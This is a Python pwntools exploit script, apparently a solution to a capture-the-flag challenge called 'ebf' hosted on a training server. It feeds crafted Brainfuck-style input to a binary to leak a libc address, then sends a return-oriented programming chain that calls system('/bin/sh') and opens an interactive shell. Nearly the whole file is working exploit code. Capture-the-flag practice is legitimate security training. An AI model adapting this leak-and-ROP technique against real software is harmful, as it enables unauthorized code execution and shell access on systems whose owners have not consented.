#!/usr/bin/env python3
from pwn import *

PORT = 1337
HOST = "pwn-ebf-a699cb277d65.training.bksec.vn"
elf = context.binary = ELF('./ebf_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            # brva 0x0000000000001544
            # brva 0x00000000000015E7
            # brva 0x0000000000001610
            brva 0x0000000000001750
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

pl1 = b'('*(0x10+1) + b'>'*(0x28-1)          # Leak libc
pl1 += b'.('*7 + b'.'
pl1 += b')'*0x18

pl2 = pl1                                    # ROPchain
pl2 += b'<'*(0x28-1)
pl2 += b',>'*(0x20-1) + b','
pl2 += b')' * 0x38 

# GDB()
sla(b'> ', pl2)
libc.address = u64(p.recv(6) + b'\x00'*2) - 0x2a1ca
log.info(f'libc: {hex(libc.address)}')

rop = flat(
    libc.address + 0x10f78b + 1,
    libc.address + 0x10f78b,
    next(libc.search(b'/bin/sh\0')),
    libc.sym.system
    )

p.send(rop)

p.interactive()